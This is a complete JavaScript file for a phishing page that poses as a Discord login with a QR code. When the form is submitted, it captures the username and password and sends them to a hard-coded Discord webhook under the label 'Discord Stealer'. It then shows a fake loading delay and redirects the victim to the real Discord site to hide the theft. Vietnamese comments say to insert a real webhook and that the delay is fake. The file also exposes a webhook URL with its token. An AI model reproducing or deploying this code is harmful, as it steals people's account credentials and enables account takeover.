document.addEventListener("DOMContentLoaded", () => {
  document.getElementById("qr").src =
    "https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=" + encodeURIComponent(Date.now());

  const form = document.getElementById("loginForm");
  const loadingScreen = document.getElementById("loading");
  const webhookURL = "https://discordapp.com/api/webhooks/1359883761784983662/Y022a7Ypkoze7L03RlBC9POV1qULOtA01VDTZ3xbtTuiPUi3tskBg9jJ-8isNWHGkYTb"; // Thay webhook thật vào đây

  form.addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // Hiện loading
    document.querySelector(".container").classList.add("hidden");
    loadingScreen.classList.remove("hidden");

    // Gửi thông tin qua webhook
    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: `@everyone **Discord Stealer** Username: ${username} Password: ${password}`
      })
    });

    // Giả delay loading
    setTimeout(() => {
      window.location.href = "https://discord.com/channels/@me";
    }, 3000);
  });
});
